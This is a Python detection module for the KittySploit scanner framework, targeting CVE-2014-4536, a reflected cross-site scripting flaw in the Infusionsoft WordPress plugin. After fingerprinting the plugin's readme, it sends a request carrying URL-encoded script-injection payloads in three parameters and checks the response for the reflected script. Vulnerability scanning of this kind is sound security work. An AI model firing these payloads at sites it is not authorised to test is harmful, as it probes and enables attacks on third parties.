#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple cross-site scripting vulnerabilities in tests/notAuto_test_ContactService_pauseCampaign."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Infusionsoft Gravity Forms Add-on < 1.5.7 - Cross-Site Scripting Detection',
        'description': 'Multiple cross-site scripting vulnerabilities in tests/notAuto_test_ContactService_pauseCampaign.php in the Infusionsoft Gravity Forms plugin before 1.5.6 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) go, (2) contactId, or (3) campaignId parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'wpscan', 'wordpress', 'wp-plugin', 'xss', 'unauth', 'katz', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/f048b5cc-5379-4c19-9a43-cd8c49c8129f',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-4536',
            'http://wordpress.org/plugins/infusionsoft/changelog',
            'http://codevigilant.com/disclosure/wp-plugin-infusionsoft-a3-cross-site-scripting-xss',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-4536',
    }

    def run(self):
        path = '/wp-content/plugins/infusionsoft/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_all = ('infusionsoft', 'tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('"></script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Infusionsoft Gravity Forms Add-on < 1.5.7 - Cross-Site Scripting detected', path=path)
            return True
        return False

